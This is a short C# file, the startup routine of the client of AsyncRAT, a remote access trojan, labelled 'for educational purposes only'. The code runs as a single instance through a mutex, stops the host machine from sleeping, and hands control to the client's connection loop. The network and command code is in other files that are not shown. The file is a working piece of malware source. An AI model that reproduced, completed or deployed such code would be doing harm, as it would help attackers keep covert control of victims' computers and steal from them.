using Lime.Connection;
using Lime.Helper;
using Lime.Settings;
using System;
using System.Threading;
using System.Windows.Forms;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT
       | Credits      : Miraculous_DZ | N A P O L E O N

       This program is distributed for educational purposes only.
*/

namespace Lime
{
    public class Program
    {
        [STAThread]
        public static void Main()
        {
            Thread.Sleep(2500);
            try
            {
                Config.programMutex = new Mutex(true, Config.currentMutex, out bool isNotRunning);
                if (!isNotRunning)
                {
                    Environment.Exit(0);
                }
                PreventSleep.Run();
                Application.ApplicationExit += new EventHandler(delegate (object o, EventArgs a)
                {
                    Config.programMutex.ReleaseMutex();
                });
            }
            catch { }

            Client.Run();
        }
    }
}